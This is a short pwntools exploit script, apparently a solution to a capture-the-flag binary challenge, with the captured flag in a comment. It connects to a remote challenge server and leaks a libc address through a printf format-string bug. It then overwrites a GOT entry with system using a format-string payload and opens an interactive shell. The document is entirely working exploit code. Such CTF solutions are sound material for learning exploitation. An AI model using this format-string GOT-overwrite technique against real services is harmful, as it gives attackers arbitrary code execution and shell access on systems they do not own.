from pwn import *
p=process('./chall')
p=remote('chall.v1t.site', 30213)
context.arch='amd64'

p.sendlineafter(b'name?\n',b'/bin/sh;')

p.sendlineafter(b'want\n',b'%27$p')
system=int(p.recvline(),16)+0x2e586

payload=fmtstr_payload(8,{0x404000:system})
p.sendline(payload)
p.interactive()
#V1T{pr1n7f5_d0n7_L13_85d372367fc6a5c183acf686abb857da}
